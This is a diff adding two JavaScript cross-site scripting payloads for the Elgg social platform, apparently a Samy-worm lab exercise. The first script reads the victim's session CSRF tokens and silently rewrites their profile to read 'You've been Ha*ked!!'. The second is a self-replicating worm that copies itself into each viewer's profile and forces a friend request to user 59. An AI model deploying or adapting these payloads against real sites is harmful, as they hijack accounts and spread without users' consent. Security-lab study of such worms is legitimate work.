@@ -1,0 +1,58 @@
+<script>
+    window.onload = function () {
+        let userName = elgg.session.user.name;
+        let guid = elgg.session.user.guid;
+        let ts = elgg.security.token.__elgg_ts;
+        let token = elgg.security.token.__elgg_token;
+        let aboutMe = "** You've been Ha*ked!! **";
+
+        let content = `__elgg_token=${token}&__elgg_ts=${ts}&name=${userName}&description=<p>${aboutMe}</p>&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=${guid}`;
+
+        let samyGuid = 59;
+        let url = `/action/profile/edit`;
+        if (guid != samyGuid) {
+            var Ajax = null;
+            Ajax = new XMLHttpRequest();
+            Ajax.open('POST', url, true);
+            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            Ajax.send(content);
+        }
+
+    }
+
+</script>
+
+
+
+
+
+
+
+<script id="worm">
+    window.onload = function () {
+    var header = `<script id="worm"> `;
+    var inner = document.getElementById("worm").innerHTML;
+    var tail = `</script>`;
+    var worm = encodeURIComponent(header + inner + tail);
+    let samyGuid = 59;
+    let guid = elgg.session.user.guid;
+    if (guid != samyGuid) {
+        let ts = elgg.security.token.__elgg_ts;
+        let token = elgg.security.token.__elgg_token;
+        let userName = elgg.session.user.name;
+        let aboutMe = worm;
+        let content = `__elgg_token=${token}&__elgg_ts=${ts}&name=${userName}&description=<p>${aboutMe}</p>&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=${guid}`;
+        let friendURL = `/action/friends/add?friend=59&__elgg_ts=${ts}&__elgg_token=${token}`;
+        let url = `/action/profile/edit`;
+        var Ajax = null;
+        Ajax = new XMLHttpRequest();
+        Ajax.open('GET', friendURL, true);
+        Ajax.send();
+        var Ajax = null;
+        Ajax = new XMLHttpRequest();
+        Ajax.open('POST', url, true);
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+    }
+}
+</script>
